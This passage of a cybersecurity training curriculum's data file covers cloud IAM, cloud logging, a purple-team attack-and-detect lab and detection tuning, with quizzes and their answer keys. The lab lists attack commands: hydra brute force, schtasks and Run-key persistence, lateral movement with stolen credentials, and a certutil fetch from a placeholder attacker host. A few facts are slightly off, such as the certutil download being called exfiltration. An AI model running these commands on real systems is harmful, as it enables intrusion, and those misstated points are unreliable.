          { question: 'What should the "Lessons Learned" section focus on?', options: ['What went well, what failed, and how to improve - blameless', 'Who made mistakes', 'Why the attacker succeeded', 'What tools were used'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Post-incident reviews are blameless and focus on process improvement.', certTags: ['Incident Response'] },
          { question: 'What is the "impact assessment" in a post-incident report?', options: ['Systems affected, data compromised, business/financial impact', 'Only technical details', 'IOCs found', 'Timeline of events'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Impact assessment quantifies the damage for business stakeholders.', certTags: ['Incident Response'] },
          { question: 'What does "timeline" in a post-incident report show?', options: ['Chronological sequence of events from detection to resolution', 'Only when the attack started', 'Only when it was fixed', 'Only analyst actions'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Timelines show the full lifecycle of the incident for analysis.', certTags: ['Incident Response'] },
          { question: 'Why should you force password resets for targeted accounts?', options: ['The attacker may have captured valid credentials during the brute force', 'Standard procedure', 'To improve password complexity', 'Management requires it'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Even if the brute force failed, some attempts may have captured credentials.', certTags: ['Incident Response'] },
          { question: 'What does "monitor" mean as the final step in the brute force playbook?', options: ['Set up watchlists and alerts for attacker IPs and affected accounts', 'Turn off monitoring', 'Delete all logs', 'Wait for next incident'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Post-incident monitoring ensures the attacker does not return.', certTags: ['Incident Response'] },
          { question: 'What should you check for during "check for compromise" beyond successful logons?', options: ['New accounts, privilege changes, process execution, persistence', 'Only successful logons', 'Nothing else needed', 'Only network traffic'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'If an attacker got in, they may have created accounts, escalated privileges, or installed persistence.', certTags: ['Incident Response'] }
        ]
      }
    ]
  },


  {
    id: 'week44',
    title: 'Cloud Security Basics',
    durationText: 'Week 44 (Days 1-2)',
    focus: 'Understand shared responsibility, cloud IAM, logging, and security tools for AWS/Azure/GCP',
    output: 'Ability to configure cloud security controls, analyze cloud logs, and identify common misconfigurations',
    topics: [
      {
        id: 'we44d01',
        title: 'Shared Responsibility & IAM',
        description: 'Understand the shared responsibility model and configure cloud IAM for least privilege',
        type: 'learn',
        duration: '4 hours',
        content: `:::objectives
- Understand the shared responsibility model across IaaS, PaaS, SaaS
- Configure IAM users, groups, roles, and policies
- Apply least privilege in cloud environments
- Compare AWS IAM, Azure AD, and GCP IAM
:::

### Shared Responsibility Model

| Layer | Cloud Provider (AWS/Azure/GCP) | Customer |
|-------|-------------------------------|----------|
| **Data** | Backup infrastructure | Data classification, encryption |
| **Applications** | Runtime environment | Application code, patches |
| **OS** | Patch management (PaaS) | OS patches (IaaS) |
| **Network** | Network infrastructure | Security groups, NACLs |
| **Physical** | Data center security | None |

### IaaS vs PaaS vs SaaS

| Model | Provider Manages | Customer Manages |
|-------|-----------------|------------------|
| **IaaS** | Hardware, network, hypervisor | OS, runtime, apps, data |
| **PaaS** | Hardware, OS, runtime | Apps, data |
| **SaaS** | Everything | Data, access controls |

### Cloud IAM Comparison

| Feature | AWS IAM | Azure AD | GCP IAM |
|---------|---------|----------|---------|
| Users | IAM Users | Azure AD Users | GCP Users |
| Groups | IAM Groups | Azure AD Groups | GCP Groups |
| Roles | IAM Roles | Managed Identities | GCP Roles |
| Policies | JSON Policy Documents | RBAC Assignments | IAM Bindings |
| MFA | Virtual/Hardware Keys | MFA/Conditional Access | Titan Security Keys |

### AWS IAM Policy Example

\`\`\`json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::my-bucket",
        "arn:aws:s3:::my-bucket/*"
      ]
    },
    {
      "Effect": "Deny",
      "Action": "s3:DeleteBucket",
      "Resource": "*",
      "Condition": {
        "StringNotLike": {
          "aws:PrincipalArn": "arn:aws:iam::123456789012:role/AdminRole"
        }
      }
    }
  ]
}
\`\`\`

### Least Privilege Principles

1. **Grant minimum permissions** - only what is needed
2. **Use roles over users** - temporary credentials
3. **Apply conditions** - restrict by IP, time, MFA
4. **Regular access reviews** - audit and remove unused permissions
5. **Use policy conditions** - require MFA for sensitive operations

:::warning
Never use root accounts for daily operations. Create IAM users with minimal permissions and enable MFA on all accounts.
:::

### Cloud Security Misconfigurations

| Misconfiguration | Risk | Detection |
|-----------------|------|-----------|
| Public S3 bucket | Data exposure | AWS Config rule |
| Open security group | Unauthorized access | VPC Flow Logs |
| No MFA on root | Account compromise | IAM credential report |
| Unused access keys | Stale credentials | IAM access analyzer |

:::classwork
**Lab:** Create an AWS IAM user with read-only S3 access using least privilege. Verify with policy simulator that the user cannot delete objects.
:::`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'Explain the shared responsibility model and where the customer responsibility begins in IaaS vs PaaS.',
        interviewAnswer: 'In IaaS, the provider manages hardware/network/hypervisor; the customer manages OS, runtime, apps, and data. In PaaS, the provider manages the OS and runtime; the customer manages only apps and data. In SaaS, the provider manages everything; the customer manages data and access. The key difference is where OS management shifts from provider to customer.',
        quiz: [
          { question: 'In IaaS, what does the customer manage?', options: ['OS, runtime, applications, data', 'Only data', 'Hardware and network', 'Nothing - provider manages all'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'In IaaS, the customer manages everything above the hypervisor: OS, runtime, apps, data.', certTags: ['Cloud Security'] },
          { question: 'What does "least privilege" mean in cloud IAM?', options: ['Grant only the minimum permissions needed for the task', 'Grant admin access to all users', 'Use root account for daily operations', 'Disable all permissions'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Least privilege limits damage from compromised accounts or insider threats.', certTags: ['Cloud Security', 'IAM'] },
          { question: 'Which AWS service tracks IAM access patterns?', options: ['IAM Access Analyzer', 'CloudWatch', 'S3', 'VPC'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'IAM Access Analyzer identifies resources shared externally andunused permissions.', certTags: ['Cloud Security', 'AWS'] },
          { question: 'What is a cloud IAM "role" used for?', options: ['Temporary credentials for services - no long-term keys', 'Permanent user account', 'Root account access', 'Billing management'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Roles provide temporary credentials, reducing risk of credential exposure.', certTags: ['Cloud Security', 'IAM'] },
          { question: 'What does a public S3 bucket expose?', options: ['Data to anyone on the internet', 'Only to AWS services', 'Only to the bucket owner', 'Nothing - S3 is always private'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Public S3 buckets are accessible to anyone with the URL.', certTags: ['Cloud Security', 'AWS'] },
          { question: 'Why should you never use root accounts for daily tasks?', options: ['Root has unrestricted access - compromise means total account takeover', 'Root is slower', 'Root cannot access S3', 'Root requires MFA'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Root accounts have full access to all services. Use IAM users with limited permissions.', certTags: ['Cloud Security'] },
          { question: 'What is the difference between IAM policies and roles?', options: ['Policies define permissions; roles provide temporary credentials to assume those permissions', 'Same thing', 'Policies are for users; roles are for services only', 'Roles are more restrictive'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Policies are JSON documents defining allowed/denied actions. Roles are assumed by users or services to get temporary credentials.', certTags: ['Cloud Security', 'IAM'] },
          { question: 'Which AWS resource tracks network traffic for security analysis?', options: ['VPC Flow Logs', 'CloudTrail', 'S3 Access Logs', 'IAM Logs'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'VPC Flow Logs capture network traffic metadata for analysis.', certTags: ['Cloud Security', 'AWS'] },
          { question: 'What is an IAM access key risk?', options: ['Stale or unused keys can be compromised without detection', 'Keys expire automatically', 'Keys are always encrypted', 'Keys cannot be stolen'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Unused access keys are a common attack vector as they go unmonitored.', certTags: ['Cloud Security', 'IAM'] },
          { question: 'In SaaS, what does the customer manage?', options: ['Data and access controls only', 'OS and applications', 'Hardware and network', 'Everything'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'In SaaS, the provider manages everything; the customer manages data and who can access it.', certTags: ['Cloud Security'] },
          { question: 'What AWS Config rule detects public S3 buckets?', options: ['s3-bucket-public-read-prohibited', 's3-bucket-encrypted', 's3-bucket-versioning-enabled', 's3-bucket-logging'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'AWS Config rules automatically check for misconfigurations like public access.', certTags: ['Cloud Security', 'AWS'] },
          { question: 'What is a "managed identity" in Azure?', options: ['Azure-managed service account - no credentials to manage', 'User-created identity', 'Root account', 'External identity provider'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Managed identities eliminate credential management for Azure services.', certTags: ['Cloud Security', 'Azure'] },
          { question: 'Why apply IAM policy conditions?', options: ['Restrict access by IP, time, or MFA status for defense in depth', 'Increase permissions', 'Speed up access', 'Reduce costs'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'Conditions add context-aware restrictions to policies.', certTags: ['Cloud Security', 'IAM'] },
          { question: 'What is the purpose of regular access reviews in cloud IAM?', options: ['Remove unused permissions and detect unauthorized access', 'Increase permissions', 'Speed up deployments', 'Reduce logging costs'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Access reviews catch permission creep and stale credentials.', certTags: ['Cloud Security', 'IAM'] },
          { question: 'Which AWS service provides audit logs of all API calls?', options: ['CloudTrail', 'CloudWatch', 'VPC Flow Logs', 'S3 Access Logs'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'CloudTrail logs all AWS API calls for auditing and compliance.', certTags: ['Cloud Security', 'AWS'] }
        ]
      },
      {
        id: 'we44d02',
        title: 'Cloud Logging & Security Tools',
        description: 'Configure cloud logging, secure storage, and use security assessment tools',
        type: 'practice',
        duration: '4 hours',
        content: `:::objectives
- Configure AWS CloudTrail, Azure Activity Log, GCP Audit Logs
- Secure S3 buckets and cloud storage
- Understand security groups vs NACLs
- Use cloud security tools: ScoutSuite, Prowler
- Apply container security basics
:::

### Cloud Logging Services

| Cloud | Logging Service | Purpose |
|-------|----------------|---------|
| AWS | CloudTrail | API call audit logging |
| AWS | VPC Flow Logs | Network traffic metadata |
| AWS | S3 Access Logs | Bucket access tracking |
| Azure | Activity Log | Control plane operations |
| Azure | NSG Flow Logs | Network traffic |
| GCP | Audit Logs | Admin and data access |
| GCP | VPC Flow Logs | Network traffic |

### CloudTrail Configuration

\`\`\`bash
# Create a trail
aws cloudtrail create-trail \\
  --name security-audit-trail \\
  --s3-bucket-name my-audit-logs-bucket \\
  --is-multi-region-trail

# Start logging
aws cloudtrail start-logging --name security-audit-trail

# Check trail status
aws cloudtrail get-trail-status --name security-audit-trail
\`\`\`

### S3 Bucket Security

\`\`\`json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyPublicAccess",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::my-bucket/*",
      "Condition": {
        "Bool": {
          "aws:SecureTransport": "false"
        }
      }
    }
  ]
}
\`\`\`

### Security Groups vs NACLs

| Feature | Security Groups | NACLs |
|---------|----------------|-------|
| Level | Instance level | Subnet level |
| State | Stateful | Stateless |
| Rules | Allow only | Allow and Deny |
| Default | Allow all outbound | Deny all inbound |
| Evaluation | All rules evaluated | Rules in order |

### Cloud Security Tools

**Prowler (AWS):**
\`\`\`bash
# Install Prowler
pip install prowler

# Run full scan
prowler aws --compliance cis_2.0

# Check specific service
prowler aws --services s3 iam
\`\`\`

**ScoutSuite:**
\`\`\`bash
# Install ScoutSuite
pip install scoutsuite

# Scan AWS
scout aws --profile my-profile

# Scan Azure
scout azure --cli
\`\`\`

### Container Security (Docker CIS Benchmark)

| Control | Check |
|---------|-------|
| 4.1 | Ensure that privileged containers are not used |
| 4.2 | Ensure containers run as non-root user |
| 4.3 | Ensure Docker socket is not mounted |
| 4.7 | Ensure containers use read-only root filesystem |
| 5.1 | Ensure AppArmor profile is enabled |
| 5.2 | Ensure SELinux security options are set |

\`\`\`bash
# Check Docker CIS compliance
docker bench security
\`\`\`

:::classwork
**Lab:** Run Prowler against a test AWS account. Identify the top 3 misconfigurations. Fix one misconfiguration and re-scan to verify.
:::`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'What is the difference between Security Groups and NACLs in AWS VPC?',
        interviewAnswer: 'Security Groups are stateful, operate at instance level, allow only Allow rules, and evaluate all rules. NACLs are stateless, operate at subnet level, support Allow and Deny rules, and evaluate rules in order. Security Groups are the primary defense; NACLs provide an additional subnet-level layer.',
        quiz: [
          { question: 'What does AWS CloudTrail log?', options: ['All AWS API calls for auditing', 'Network traffic only', 'S3 file contents only', 'IAM user passwords'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'CloudTrail records every API call made to AWS services.', certTags: ['Cloud Security', 'AWS'] },
          { question: 'What is the difference between Security Groups and NACLs?', options: ['SGs are stateful at instance level; NACLs are stateless at subnet level', 'Same thing', 'NACLs are faster', 'SGs deny traffic; NACLs allow'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Security Groups are stateful instance firewalls; NACLs are stateless subnet firewalls.', certTags: ['Cloud Security', 'AWS'] },
          { question: 'What does Prowler check for?', options: ['AWS misconfigurations against CIS benchmarks and best practices', 'Malware on EC2 instances', 'Network intrusions', 'Application vulnerabilities'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Prowler scans AWS for misconfigurations against CIS and compliance frameworks.', certTags: ['Cloud Security'] },
          { question: 'What does a "stateful" firewall mean?', options: ['It tracks connection state - return traffic is automatically allowed', 'It maintains a list of rules', 'It requires manual rule updates', 'It only allows outgoing traffic'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Stateful firewalls track connection state, so response packets are automatically allowed.', certTags: ['Cloud Security'] },
          { question: 'Why encrypt S3 buckets at rest?', options: ['Protects data even if bucket permissions are misconfigured', 'Required by AWS', 'Improves performance', 'Reduces costs'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Encryption at rest protects data even if access controls fail.', certTags: ['Cloud Security', 'AWS'] },
          { question: 'What is the default inbound rule for a Security Group?', options: ['Deny all inbound traffic', 'Allow all inbound traffic', 'Allow HTTP only', 'Allow SSH only'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Security Groups default to deny all inbound, allow all outbound.', certTags: ['Cloud Security', 'AWS'] },
          { question: 'What does the Docker CIS Benchmark check for?', options: ['Container security best practices - privilege, root, socket mounts', 'Docker Hub image vulnerabilities', 'Docker networking performance', 'Docker storage capacity'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Docker CIS Benchmark checks privileged containers, root execution, socket mounts, etc.', certTags: ['Cloud Security', 'Containers'] },
          { question: 'What does VPC Flow Logs capture?', options: ['Network traffic metadata - IP, port, protocol, action', 'Full packet contents', 'Application logs', 'IAM API calls'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'VPC Flow Logs capture network flow metadata, not full packet contents.', certTags: ['Cloud Security', 'AWS'] },
          { question: 'What is the purpose of S3 bucket versioning?', options: ['Protects against accidental deletion by keeping object versions', 'Improves performance', 'Reduces costs', 'Required by AWS'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Versioning preserves, retrieves, and restores every version of every object.', certTags: ['Cloud Security', 'AWS'] },
          { question: 'What does Azure Activity Log track?', options: ['Control plane operations - who did what on which resource', 'Data plane operations', 'Network traffic', 'IAM passwords'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Activity Log records control plane operations for Azure resources.', certTags: ['Cloud Security', 'Azure'] },
          { question: 'What does `docker bench security` do?', options: ['Checks Docker configuration against CIS Docker Benchmark', 'Scans images for malware', 'Tests Docker performance', 'Updates Docker'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'docker bench security automates CIS Docker Benchmark checks.', certTags: ['Cloud Security', 'Containers'] },
          { question: 'Why run NACLs in addition to Security Groups?', options: ['Defense in depth - NACLs provide subnet-level deny rules', 'NACLs are faster', 'Required by AWS', 'Security Groups cannot deny traffic'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'NACLs add a deny-based layer that Security Groups lack.', certTags: ['Cloud Security', 'AWS'] },
          { question: 'What does `aws:SecureTransport` condition check?', options: ['Whether the request was made over HTTPS', 'Whether the user is using MFA', 'Whether the instance is in a VPC', 'Whether the bucket is encrypted'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'aws:SecureTransport ensures only HTTPS connections are allowed.', certTags: ['Cloud Security', 'AWS'] },
          { question: 'What is a container "read-only root filesystem"?', options: ['Container cannot write to its own filesystem - prevents persistence', 'Container runs as root', 'Container has full network access', 'Container uses encrypted storage'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'Read-only root filesystem prevents malware from writing to the container.', certTags: ['Cloud Security', 'Containers'] },
          { question: 'What does ScoutSuite do for cloud security?', options: ['Audits cloud accounts and generates security reports', 'Protects against DDoS', 'Monitors application performance', 'Manages IAM users'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'ScoutSuite audits cloud configurations and produces detailed security reports.', certTags: ['Cloud Security'] }
        ]
      }
    ]
  },
  {
    id: 'week45',
    title: 'Purple Team Simulation & Phase 6 Review',
    durationText: 'Week 45 (Days 1-2)',
    focus: 'Execute attack-defense exercises, tune detections, and comprehensive Phase 6 review',
    output: 'Completed purple team exercise with documented detection coverage and tuned rules',
    topics: [
      {
        id: 'we45d01',
        title: 'Attack-Defense Purple Team Exercise',
        description: 'Run attacks, observe detections, map to ATT&CK, and document what was detected vs missed',
        type: 'lab',
        duration: '5 hours',
        content: `:::objectives
- Execute a coordinated attack against your lab environment
- Observe which attacks trigger detections in Wazuh/Sysmon
- Map attacks to MITRE ATT&CK techniques
- Document detection coverage and gaps
:::

### Exercise Setup

**Attack Machine:** Kali Linux or attacker VM
**Defensive Target:** Windows VM with Wazuh agent + Sysmon
**SIEM:** Wazuh dashboard

### Attack Sequence

\`\`\`
PHASE 1: Reconnaissance
  +-- Nmap scan: nmap -sV -sC target-ip
  +-- Observe: No detection expected (network scan)

PHASE 2: Initial Access
  +-- Credential brute force: hydra -l admin -P passwords.txt ssh://target-ip
  +-- Observe: Should trigger Wazuh brute force alert

PHASE 3: Execution
  +-- SSH into target, run: whoami, ipconfig, net user
  +-- Observe: Should generate process creation events

PHASE 4: Persistence
  +-- Create scheduled task: schtasks /create /tn "Updater" /tr "C:\\temp\\update.exe" /sc onstart
  +-- Create registry run key: reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v UpdateService /d C:\\temp\\update.exe
  +-- Observe: Should trigger Sysmon Event 13 and Wazuh alerts

PHASE 5: Privilege Escalation
  +-- Attempt token impersonation or service misconfiguration exploit
  +-- Observe: Should generate privilege escalation events

PHASE 6: Lateral Movement
  +-- Use stolen creds: net use \\\\target2-ip\\C$ /user:admin password
  +-- Observe: Should generate network logon events

PHASE 7: Exfiltration
  +-- Compress and upload data: certutil -urlcache -split -f http://attacker-ip/data.zip
  +-- Observe: Should generate network connection events
\`\`\`

### ATT&CK Mapping

| Attack Step | ATT&CK Technique | Detected? | Detection Source |
|-------------|------------------|-----------|------------------|
| Nmap scan | T1046 - Network Service Scanning | No | Network IDS |
| Brute force | T1110 - Brute Force | Yes | Wazuh 5716 |
| Process recon | T1082 - System Info Discovery | Yes | Sysmon 1 |
| Scheduled task | T1053 - Scheduled Task | Yes | Sysmon 1, Event 4698 |
| Registry persistence | T1547 - Registry Run Key | Yes | Sysmon 13 |
| Credential theft | T1003 - Credential Dumping | Partial | Sysmon 10 |
| Lateral movement | T1021 - Remote Services | Yes | Event 4624 Type 3 |
| Exfiltration | T1041 - Exfil Over C2 | Yes | Sysmon 3 |

### Documentation Template

\`\`\`
PURPLE TEAM EXERCISE REPORT

Date: YYYY-MM-DD
Analyst: [Name]

EXECUTED ATTACKS:
1. Nmap scan -> T1046 -> NOT DETECTED
2. SSH brute force -> T1110 -> DETECTED (Wazuh rule 5716)
3. Process recon -> T1082 -> DETECTED (Sysmon Event 1)
...

DETECTION COVERAGE:
- Total attacks executed: 8
- Detected: 6 (75%)
- Partially detected: 1 (12.5%)
- Not detected: 1 (12.5%)

GAPS IDENTIFIED:
1. Network scanning (T1046) - need network IDS
2. Credential dumping partial - need LSASS monitoring

ACTIONS:
1. Add Sigma rule for T1046
2. Enable Sysmon Event 10 with LSASS access detection
3. Re-test after tuning
\`\`\`

:::classwork
**Lab:** Execute the full attack sequence above. Document each attack, whether it was detected, and map to ATT&CK. Identify the top 3 detection gaps and create Sigma/Wazuh rules to fill them.
:::`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'How do you measure detection coverage in a purple team exercise?',
        interviewAnswer: 'Count total attacks executed, how many triggered alerts, how many were partially detected, and how many were missed. Calculate detection rate as (detected + partially detected) / total. Map each attack to ATT&CK techniques to identify coverage gaps. Prioritize gaps by MITRE technique frequency in real-world attacks.',
        quiz: [
          { question: 'What is a purple team exercise?', options: ['Coordinated attack and defense exercise where both teams work together', 'Red team only attack', 'Blue team only defense', 'Management review'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Purple teaming combines red team attacks with blue team detection in a collaborative exercise.', certTags: ['Purple Team'] },
          { question: 'Why map attacks to MITRE ATT&CK during purple teaming?', options: ['To measure detection coverage and identify gaps systematically', 'To document attacker skills', 'To satisfy compliance', 'To train the AI'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'ATT&CK mapping provides a structured way to measure what you can and cannot detect.', certTags: ['Purple Team', 'MITRE ATT&CK'] },
          { question: 'What ATT&CK technique does Nmap scanning correspond to?', options: ['T1046 - Network Service Scanning', 'T1595 - Active Scanning', 'T1018 - Remote System Discovery', 'T1049 - System Network Connections'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'T1046 covers network service scanning techniques like Nmap.', certTags: ['Purple Team', 'MITRE ATT&CK'] },
          { question: 'What Wazuh rule detects SSH brute force?', options: ['Rule 5716', 'Rule 5901', 'Rule 100100', 'Rule 4625'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Wazuh rule 5716 detects SSH failed login attempts.', certTags: ['Wazuh', 'SOC'] },
          { question: 'What is the goal of documenting detection gaps?', options: ['Create rules to fill the gaps and improve detection coverage', 'Justify budget', 'Blame the SOC team', 'Satisfy auditors'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Gap analysis leads to targeted rule creation and improved defense.', certTags: ['Purple Team'] },
          { question: 'What does "partial detection" mean in a purple team exercise?', options: ['The attack was detected but not all stages or indicators were caught', 'The alert fired but was ignored', 'The attack was stopped', 'The detection was wrong'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Partial detection means some indicators were caught but others were missed.', certTags: ['Purple Team'] },
          { question: 'Which attack technique creates a scheduled task for persistence?', options: ['T1053 - Scheduled Task/Job', 'T1547 - Registry Run Key', 'T1059 - Command Interpreter', 'T1021 - Remote Services'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'T1053 covers scheduled task creation for persistence.', certTags: ['MITRE ATT&CK'] },
          { question: 'What does Sysmon Event 13 detect during persistence setup?', options: ['Registry modification - Run key for auto-start', 'Process creation', 'Network connection', 'File creation'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Event 13 captures registry modifications, including Run key persistence.', certTags: ['Sysmon'] },
          { question: 'What is the detection rate formula in purple teaming?', options: ['(Detected + Partially Detected) / Total Attacks', 'Detected / Total Attacks', 'Detected / Missed', 'Total Attacks / Detected'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Detection rate includes both full and partial detections.', certTags: ['Purple Team'] },
          { question: 'Why is network scanning often not detected by host-based SIEM?', options: ['Nmap sends packets to other hosts, not the monitored endpoint', 'Nmap is encrypted', 'Nmap runs too fast', 'SIEM ignores network traffic'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'Host-based SIEM (Wazuh agent) does not see outbound scan traffic to other hosts.', certTags: ['Purple Team', 'Network'] },
          { question: 'What should you do after identifying detection gaps?', options: ['Create Sigma/Wazuh rules to fill the gaps and re-test', 'Ignore them', 'Disable alerts', 'Wait for vendor update'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Gap remediation is the core purpose of purple teaming.', certTags: ['Purple Team'] },
          { question: 'What does certutil -urlcache -split -f do in an attack?', options: ['Downloads a file from a remote URL using a legitimate Windows tool', 'Checks certificate validity', 'Caches DNS entries', 'Splits log files'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'certutil is abused to download malware using a legitimate Windows binary.', certTags: ['Defense Evasion'] },
          { question: 'What is the correct order of the attack sequence in a purple team exercise?', options: ['Recon -> Initial Access -> Execution -> Persistence -> Priv Esc -> Lateral -> Exfil', 'Exfil -> Persistence -> Recon', 'Persistence -> Execution -> Recon', 'Lateral -> Priv Esc -> Initial Access'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'The attack chain follows the MITRE ATT&CK kill chain order.', certTags: ['Purple Team', 'MITRE ATT&CK'] },
          { question: 'What does `net use \\\\target\\C$` indicate in an attack?', options: ['Lateral movement - attempting to access admin share with stolen credentials', 'Normal file sharing', 'Backup operation', 'Print service'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Admin share access is a common lateral movement technique.', certTags: ['Lateral Movement'] },
          { question: 'What is the purpose of re-testing after detection tuning?', options: ['Verify that new rules detect previously missed attacks without increasing FPs', 'Save time', 'Compliance requirement', 'Satisfy management'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Re-testing confirms that gap remediation works without degrading detection quality.', certTags: ['Purple Team', 'Detection'] },
          { question: 'Why document "partially detected" attacks separately?', options: ['They need improvement - some indicators were caught but not all', 'They are the same as fully detected', 'They should be ignored', 'They only matter for compliance'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'Partial detections indicate where detection logic needs enhancement.', certTags: ['Purple Team'] }
        ]
      },
      {
        id: 'we45d02',
        title: 'Detection Tuning & Phase 6 Review',
        description: 'Tune Sigma rules, add new detections, re-test, and comprehensive Phase 6 review',
        type: 'review',
        duration: '4 hours',
        content: `:::objectives
- Tune Sigma rules to reduce false positives
- Add new detections for missed techniques
- Re-test after tuning
- Comprehensive Phase 6 review covering all topics
:::

### Tuning Process

\`\`\`
1. Review purple team gaps
2. Create new Sigma/Wazuh rules for missed techniques
3. Test rules with wazuh-logtest
4. Deploy rules
5. Monitor for false positives for 24-48 hours
6. Tune rules based on FP feedback
7. Re-test with purple team attacks
8. Document final detection coverage
\`\`\`

### Rule Tuning Checklist

\`\`\`
NEW RULE:
[ ] Rule correctly matches the target technique
[ ] Rule does NOT match known-good activity
[ ] Rule severity is appropriate
[ ] Rule has clear description
[ ] Rule has correct MITRE ATT&CK tags
[ ] Rule tested with wazuh-logtest
[ ] Rule deployed to test group first
[ ] FP monitoring for 24-48 hours

TUNING EXISTING RULE:
[ ] Identified the FP pattern
[ ] Added exclusion filter (IP, process, user)
[ ] Verified rule still matches true positives
[ ] Tested with wazuh-logtest
[ ] Deployed and monitored
\`\`\`

### Phase 6 Comprehensive Review

:::checkpoint
**Scenario-Based Review Questions:**

1. **Wazuh Setup:** You need to deploy Wazuh in a production environment. Walk through the installation steps, security hardening, and agent deployment process.

2. **Log Analysis:** You receive this log entry: "Event ID 4625, Status 0xC000006A, Logon Type 3, Source: 10.0.0.50". What does this mean and how do you investigate?

3. **Sigma Rules:** Write a Sigma rule to detect scheduled task creation via command line. Include all required fields.

4. **SOC Triage:** An alert fires for "LSASS access by unknown process". Walk through your triage process step by step.

5. **MITRE ATT&CK:** Map the following attack chain to ATT&CK: Phishing email -> PowerShell execution -> Credential dumping -> Lateral movement via RDP -> Data exfiltration.

6. **Detection Engineering:** What is the difference between signature-based and behavioral detection? Give an example of when to use each.

7. **YARA Rules:** Write a YARA rule that detects a file containing the string "mimikatz" and the hex pattern { 4D 5A 90 00 }.

8. **Sysmon:** Which Sysmon events would you monitor to detect web shell exploitation on an IIS server?

9. **Forensics:** You have a memory dump. What are the first 3 Volatility commands you would run and why?

10. **Incident Response:** A ransomware incident is detected. Walk through the first 5 steps of the IR playbook.

11. **Cloud Security:** Explain the shared responsibility model for IaaS. What does the customer manage?

12. **Threat Intelligence:** How do you operationalize a new IOC from a threat feed into your Wazuh SIEM?

13. **Purple Team:** After a purple team exercise, you find that network scanning (T1046) is not detected. How do you address this gap?

14. **Tuning:** A brute force detection rule is generating 50+ false positives per day from a service account. How do you tune it without disabling the detection?

15. **Investigation:** You pivot from an IP address and find it in DNS logs, firewall logs, and SIEM alerts from 5 endpoints. What does this indicate and what are your next steps?
:::

### Phase 6 Skills Summary

| Topic | Key Skill | Validation |
|-------|-----------|------------|
| Wazuh Setup | Deploy and configure Wazuh SIEM | Agent connected, alerts flowing |
| Log Analysis | Read Windows/Linux security logs | Can identify Event IDs and patterns |
| Sigma Rules | Write detection rules in Sigma format | Rules convert to platform queries |
| SOC Triage | Triage alerts using methodology | Correct TP/FP classification |
| Threat Intel | Consume and operationalize IOCs | IOCs integrated into detection |
| ATT&CK | Map attacks to techniques | Navigator layer completed |
| Detection Eng | Build signature and behavioral detections | Rules deployed and tuned |
| YARA Rules | Write malware detection rules | Rules test correctly against samples |
| Sysmon | Configure and analyze Sysmon events | Events captured and analyzed |
| Endpoint | Investigate suspicious processes | Process tree analysis complete |
| Forensics | Memory and disk forensics | Evidence extracted and documented |
| IR Playbooks | Execute structured IR procedures | Playbooks followed and documented |
| Cloud Security | Configure cloud IAM and logging | Misconfigurations identified |
| Purple Team | Execute attack-defense exercises | Detection coverage measured |
:::`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'How do you approach detection tuning after a purple team exercise identifies false positives?',
